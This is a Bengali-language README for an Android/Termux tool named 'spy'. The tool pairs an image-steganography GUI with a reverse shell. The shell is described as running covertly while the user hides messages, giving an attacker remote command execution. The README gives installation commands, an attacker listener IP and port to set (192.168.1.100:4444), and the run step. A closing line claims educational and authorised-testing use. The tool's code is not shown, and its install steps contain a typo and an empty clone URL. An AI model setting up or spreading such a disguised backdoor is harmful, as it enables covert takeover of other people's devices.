# spy
### ** (Steganography + Reverse Shell)**

কোডটি (ছবির ভিতরে ডাটা লুকানো) ফিচার একত্রিত করা হয়েছে।

### **Step-by-Step Guide: Termux Setup & Execution**

1. **Termux ইনস্টল করুন (Android ডিভাইসে)**:
   - **Termux** ইনস্টল করার জন্য Google Play Store থেকে **Termux** অ্যাপটি ডাউনলোড এবং ইনস্টল করুন।

2. **Termux-এ প্রয়োজনীয় প্যাকেজ ইনস্টল করুন**:
   - **Python** এবং **Tkinter** ইন্সটল করতে হবে।

   ```bash
   pkg update && pkg upgrade -y
   pkg install python -y
   pkg install python-pip -y
   pip install stegano
   pip install tk
   pkg instoll git
   git clone 
   ```

3. **কোড ফাইল তৈরি করুন**:
   - কোডটি একটি `.py` ফাইলে সেভ করতে হবে। আপনি Termux এর মধ্যে যে কোনো টেক্সট এডিটর ব্যবহার করে ফাইলটি তৈরি করতে পারেন, যেমন:
   
   ```bash
   cd spy
   ```

 4. **ব্যাকডোর পোর্ট ও IP সেট করুন**:
   - কোডে `server_ip` এবং `server_port` এর মান নির্ধারণ করতে হবে। এই তথ্যটি আপনার **attacker machine** বা **listener** এর IP এবং পোর্ট হতে হবে।
   
   উদাহরণস্বরূপ:
   ```python
   server_ip = "192.168.1.100"  # আক্রমণকারী সিস্টেমের IP
   server_port = 4444  # আপনার পছন্দের পোর্ট
   ```

5. **স্টেগানোগ্রাফি এবং ব্যাকডোর চালু করুন**:
   - কোড ফাইলটি চালাতে হলে **Python** দিয়ে রান করতে হবে:
   ```bash
   python Spy.py
   ```

   এতে একটি GUI প্রদর্শিত হবে যেখানে আপনি ছবি নির্বাচন করে গোপন বার্তা লুকাতে পারবেন। এছাড়া **reverse shell** কোডটি গোপনে কাজ করবে এবং আক্রমণকারী সিস্টেমে **কমান্ড** পাঠাতে সক্ষম হবে।

---

### **Information Capture Workflow**:
এখানে আপনার **Information Capture** প্রক্রিয়া কীভাবে কাজ করবে তা বিস্তারিত:

1. **স্টেগানোগ্রাফি**:
   - **ব্যবহারকারী একটি ছবি নির্বাচন করবে**।
   - **সেক্রেট মেসেজ** (যেমন ফাইল বা টেক্সট) সেই ছবির মধ্যে লুকানো হবে।
   - ব্যবহারকারী সেই ছবি **output.png** হিসাবে সেভ করবে। এই ছবিটি এখন বাহ্যিকভাবে কোনো কিছু ধারণ করছে না, কিন্তু এটি আসলে গোপন তথ্য ধারণ করছে।

2. **ব্যাকডোর (Reverse Shell)**:
   - টুলটি রান হলে এটি **Reverse Shell** সিস্টেম চালু করবে।
   - আক্রমণকারী (Attacker) **কোনো কমান্ড** পাঠাতে পারবে এবং সিস্টেম থেকে আউটপুট পেতে পারবে।
   - **আক্রমণকারী সিস্টেম** থেকে **shell** কার্যক্রম নিয়ন্ত্রণ করা যাবে।

---

### **অতিরিক্ত নিরাপত্তা এবং সতর্কতা:**
- **শিক্ষামূলক উদ্দেশ্যে** এই টুলটি ব্যবহার করুন।
- এই টুলের মাধ্যমে **অন্যদের অনুমতি ছাড়া** কোনো সিস্টেমে প্রবেশ বা কোনো বেআইনি কার্যক্রম করা সম্পূর্ণ অবৈধ এবং শাস্তিযোগ্য।
- **ব্যাকডোর** চালু করা সিস্টেমের নিরাপত্তা ঝুঁকি সৃষ্টি করতে পারে, তাই **এটি শুধুমাত্র অনুমোদিত পরীক্ষার জন্য** ব্যবহার করুন।
